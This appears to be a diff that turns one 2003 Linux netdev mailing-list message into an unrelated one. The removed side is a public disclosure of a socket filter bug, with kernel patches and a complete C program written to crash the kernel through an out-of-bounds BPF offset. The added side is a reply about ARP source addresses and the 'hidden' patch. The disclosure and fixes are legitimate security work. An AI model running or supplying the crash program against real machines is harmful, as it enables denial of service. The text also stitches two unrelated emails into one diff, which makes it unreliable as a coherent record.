@@ -1,141 +1,33 @@
-From: Patrick McHardy <kaber@trash.net>
-Subject: Local dos in linux socket filters
-Date: Fri, 25 Jul 2003 20:20:22 +0200
-Sender: linux-net-owner@vger.kernel.org
-Message-ID: <3F2174E6.7060700@trash.net>
+From: "Carlos Velasco" <carlosev@newipnet.com>
+Subject: Re: Bug? ARP with wrong src IP address
+Date: Fri, 25 Jul 2003 20:24:19 +0200
+Sender: netdev-bounce@oss.sgi.com
+Message-ID: <200307252024190066.051F80CE@192.168.128.16>
+References: <200307241728270476.0031BAB0@192.168.128.16>
+ <Pine.LNX.4.44.0307241849341.2177-100000@l>
+ <20030724091007.68923845.davem@redhat.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed;
- boundary="------------030305030001080202030804"
-Return-path: <linux-net-owner@vger.kernel.org>
-To: netdev@oss.sgi.com, linux-net@vger.kernel.org
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 8bit
+Cc: bdschuym@pandora.be, netdev@oss.sgi.com
+Return-path: <netdev-bounce@oss.sgi.com>
+In-Reply-To: <20030724091007.68923845.davem@redhat.com>
+To: "David S. Miller" <davem@redhat.com>, "Julian Anastasov" <ja@ssi.bg>
+Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
-This is a multi-part message in MIME format.
---------------030305030001080202030804
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Transfer-Encoding: 7bit
+On 24/07/2003 at 9:10 David S. Miller wrote:
 
-Dave Miller asked me to post this so it is public:
+>The hidden patch is not necessary with current kernels and arpfilter.
 
-The Linux Socket Filter implementation contains a bug which
-can lead to a local dos. Due to a unsigned->signed conversion
-and insufficient bounds checking it is possible to crash the kernel
-by accessing unmapped memory. The bug was introduced
-during the attempt to fix other signedness issues in 2.4.3-pre3.
+arp_filter doesn't work.
+If I'm not wrong it's applied when you have two or more interfaces in the same subnet. This is not the case.
 
-The attached two patches for 2.4 and 2.6 fix the problem (already
-in davem's tree). Also attached is a program to crash your kernel.
+I have applied hidden patch and it works.
+If I'm not wrong, the hidden patch makes linux behave like other OS, separating selected interfaces of another interfaces.
+It does not break anything because it's all configurable in /proc.
 
-Bye,
-Patrick
+Maybe it would be good including it in the kernel package?
 
---------------030305030001080202030804
-Content-Type: text/plain;
- name="linux-2.4-sock_filter-dos.diff"
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline;
- filename="linux-2.4-sock_filter-dos.diff"
-
-===== filter.c 1.3 vs edited =====
---- 1.3/net/core/filter.c	Tue Feb  5 08:40:16 2002
-+++ edited/filter.c	Fri Jul 25 02:16:30 2003
-@@ -294,10 +294,9 @@
- 				goto load_b;
- 
- 			case BPF_LDX|BPF_B|BPF_MSH:
--				k = fentry->k;
--				if(k >= 0 && (unsigned int)k >= len)
-+				if(fentry->k >= len)
- 					return (0);
--				X = (data[k] & 0xf) << 2;
-+				X = (data[fentry->k] & 0xf) << 2;
- 				continue;
- 
- 			case BPF_LD|BPF_IMM:
-
---------------030305030001080202030804
-Content-Type: text/plain;
- name="linux-2.6-sock_filter-dos.diff"
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline;
- filename="linux-2.6-sock_filter-dos.diff"
-
-===== net/core/filter.c 1.6 vs edited =====
---- 1.6/net/core/filter.c	Thu Jun  5 02:57:08 2003
-+++ edited/net/core/filter.c	Fri Jul 25 02:35:07 2003
-@@ -256,10 +256,9 @@
- 			k = X + fentry->k;
- 			goto load_b;
- 		case BPF_LDX|BPF_B|BPF_MSH:
--			k = fentry->k;
--			if (k >= 0 && (unsigned int)k >= len)
-+			if (fentry->k >= len)
- 				return 0;
--			X = (data[k] & 0xf) << 2;
-+			X = (data[fentry->k] & 0xf) << 2;
- 			continue;
- 		case BPF_LD|BPF_IMM:
- 			A = fentry->k;
-
---------------030305030001080202030804
-Content-Type: text/x-csrc;
- name="socketfilter.c"
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline;
- filename="socketfilter.c"
-
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <net/bpf.h>
-#include <errno.h>
-
-int main(int argc, char **argv)
-{
-	struct sockaddr_in sin;
-	struct bpf_program bp;
-	struct bpf_insn buf[10];
-	char rcvbuf[2000];
-	int i = 0;
-	int fd;
-
-	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	if (fd < 0) {
-		perror("socket");
-		exit(1);
-	}
-
-	memset(buf, 0, sizeof(buf));
-
-	buf[i].code = BPF_LDX|BPF_B|BPF_MSH;
-	buf[i].k    = (1<<31) + (1<<29);
-	i++;
-	
-	buf[i].code = BPF_RET;
-	i++;
-
-	bp.bf_len = i;
-	bp.bf_insns = buf;
-
-	if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &bp, sizeof(bp)) < 0) {
-		perror("setsockopt");
-		exit(1);
-	}
-
-	sin.sin_family      = AF_INET;
-	sin.sin_addr.s_addr = INADDR_ANY;
-	sin.sin_port        = htons(10000);
-
-	if (bind(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-		perror("bind");
-		exit(1);
-	}
-
-	if (recvfrom(fd, rcvbuf, sizeof(rcvbuf), 0, NULL, 0) < 0) {
-		perror("recvfrom");
-		exit(1);
-	}
-}
-
---------------030305030001080202030804--
-
+Regards,
+Carlos Velasco
